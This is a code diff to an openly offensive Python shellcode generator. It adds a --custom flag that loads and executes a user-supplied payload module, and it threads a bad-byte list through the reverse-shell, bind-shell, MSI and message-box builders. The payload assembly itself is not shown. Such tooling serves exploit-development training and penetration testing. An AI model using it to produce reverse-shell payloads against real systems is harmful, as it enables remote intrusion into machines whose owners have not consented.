@@ -2,6 +2,7 @@
 import sys
 import argparse
 import ctypes
+import importlib.util
 import struct
 import re
 import keystone as ks
@@ -147,6 +148,22 @@ def abort_on_bad_chars(data, bad_chars, warning, abort_message):
     check_and_disassemble(data, bad_chars)
     print(f"\n{Fore.RED}[!] {abort_message}{Style.RESET_ALL}")
     sys.exit(1)
+
+
+def load_custom_shellcode(path):
+    """Load a user payload module and return its standard builder function."""
+    spec = importlib.util.spec_from_file_location("custom_shellcode", path)
+    if spec is None or spec.loader is None:
+        raise ValueError(f"could not load custom shellcode file: {path}")
+
+    module = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(module)
+    builder = getattr(module, "shellcode", None)
+    if not callable(builder):
+        raise ValueError(
+            f"custom shellcode file {path!r} must define a callable shellcode()"
+        )
+    return builder
 
 
 def build_encoded_shellcode(payload, bad_chars, initial_key, ks_engine):
@@ -355,10 +372,10 @@ def check_and_disassemble(encoding, bad_bytes):
 
 
 def main(args):
-    bad_ints = []
+    bad_bytes = []
     if args.bad_chars:
         try:
-            bad_ints = parse_badchars_string(args.bad_chars)
+            bad_bytes = parse_badchars_string(args.bad_chars)
         except ValueError:
             print(
                 f"{Fore.RED}[!] Error parsing bad chars. Use string format "
@@ -366,14 +383,23 @@ def main(args):
             )
             sys.exit(1)
 
-    if args.msi:
-        shellcode_asm = msi_shellcode(args.lhost, args.lport, args.debug_break)
+    if args.custom:
+        try:
+            custom_builder = load_custom_shellcode(args.custom)
+            shellcode_asm = custom_builder(
+                args.lhost, args.lport, args.debug_break, bad_bytes
+            )
+        except Exception as error:
+            print(f"{Fore.RED}[!] Error loading custom shellcode: {error}{Style.RESET_ALL}")
+            sys.exit(1)
+    elif args.msi:
+        shellcode_asm = msi_shellcode(args.lhost, args.lport, args.debug_break, bad_bytes)
     elif args.messagebox:
-        shellcode_asm = msg_box(args.mb_header, args.mb_text, args.debug_break)
+        shellcode_asm = msg_box(args.mb_header, args.mb_text, args.debug_break, bad_bytes)
     elif args.bind:
-        shellcode_asm = bind_shellcode(args.lport, args.debug_break)
+        shellcode_asm = bind_shellcode(args.lport, args.debug_break, bad_bytes)
     else:
-        shellcode_asm = rev_shellcode(args.lhost, args.lport, args.debug_break)
+        shellcode_asm = rev_shellcode(args.lhost, args.lport, args.debug_break, bad_bytes)
 
     if args.show_asm:
       print(shellcode_asm)
@@ -390,7 +416,7 @@ def main(args):
     if args.key:
         initial_key = parse_key_arg(args.key)
         solved_key, decoder, encoded_shellcode = build_encoded_shellcode(
-            encoding, bad_ints, initial_key, eng
+            encoding, bad_bytes, initial_key, eng
         )
         final_shellcode = decoder + encoded_shellcode
         print_encoding_success(solved_key)
@@ -405,7 +431,7 @@ def main(args):
         final_shellcode = encoding
         abort_on_bad_chars(
             final_shellcode,
-            bad_ints,
+            bad_bytes,
             "WARNING: Final shellcode still contains bad chars!",
             "Shellcode generation aborted due to bad chars.",
         )
@@ -514,6 +540,14 @@ if __name__ == "__main__":
     )
     parser.add_argument(
         "--messagebox", help="create a message box payload", action="store_true"
+    )
+    parser.add_argument(
+        "--custom",
+        metavar="PATH",
+        help=(
+            "load a custom Python payload module; it must define "
+            "shellcode(lhost, lport, breakpoint=0, bad_bytes=None)"
+        ),
     )
     parser.add_argument("--mb-header", default="WARNING!", help="message box header text")
     parser.add_argument("--mb-text", default="You have been pwned", help="message box text")
